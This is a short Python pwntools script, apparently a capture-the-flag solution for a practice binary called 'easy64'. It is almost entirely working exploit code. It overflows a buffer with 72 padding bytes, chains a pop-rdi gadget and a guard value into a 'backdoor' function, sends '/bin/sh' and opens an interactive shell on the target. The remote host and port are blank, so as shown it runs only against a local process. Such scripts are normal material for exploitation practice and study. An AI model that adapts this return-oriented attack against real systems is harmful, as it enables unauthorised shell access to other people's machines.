#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import*

context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'new-window'])
def debug(cmd=''):
	cmd += "b main\n"
	gdb.attach(p, cmd)
	pause()

host = ""
port = 0
p = process("./easy64")
#p = remote(host, port)

main = 0x4007AC
backdoor = 0x400737
vul = 0x400768
guard = 114
rdi_ret = 0x4008A3
ret = 0x4008A4
payload = '\x00' * 72  + p64(rdi_ret) + p64(guard) + p64(ret) + p64(vul)+ p64(backdoor)

p.recvline()
# debug()
p.sendline(payload)

p.sendline("/bin/sh")


p.interactive()